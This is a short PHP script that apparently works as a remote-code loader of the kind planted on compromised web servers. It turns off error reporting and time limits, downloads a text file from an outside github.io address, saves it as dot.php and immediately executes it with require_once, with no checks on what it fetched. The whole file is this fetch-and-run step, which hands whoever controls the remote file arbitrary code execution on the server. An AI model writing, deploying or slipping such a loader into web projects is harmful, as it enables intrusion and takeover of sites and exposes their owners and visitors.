<?php
error_reporting(0);
set_time_limit(0);
$site = 'https://thearthouse.github.io/reid.txt';
$homepage = file_get_contents($site);
$filename = 'dot.php';
$handle = fopen($filename,"w");
fwrite($handle,$homepage);
fclose($handle);
require_once './dot.php';
